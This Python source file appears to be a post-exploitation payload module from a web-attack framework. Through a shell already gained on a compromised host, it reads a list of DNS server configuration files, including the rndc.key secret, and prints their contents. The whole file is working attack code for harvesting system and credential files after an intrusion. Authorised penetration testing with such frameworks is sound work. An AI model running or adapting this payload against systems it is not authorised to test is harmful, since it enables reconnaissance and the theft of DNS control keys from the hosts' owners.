import re
from plugins.attack.payloads.base_payload import base_payload

class dns_config_files(base_payload):
    '''
    This payload shows DNS Server configuration files
    '''
    def api_read(self):
        result = {}
        files = []

        files.append('/etc/named.conf')
        files.append('/etc/bind/named.conf.local')
        files.append('/etc/bind/named.conf')
        files.append('/var/named/named.conf')
        files.append('/var/named/private.rev')
        files.append('/etc/bind/named.conf.options')
        files.append('/etc/resolv.conf')
        files.append('/etc/rndc.conf ')
        files.append('/etc/rndc.key')

        for file in files:
            content = self.shell.read(file)
            if content:
                result.update({file:content})
        return result
        
    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('DNS Config Files')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        
        if result == [ ]:
            result.append('DNS configuration files not found.')
        return result
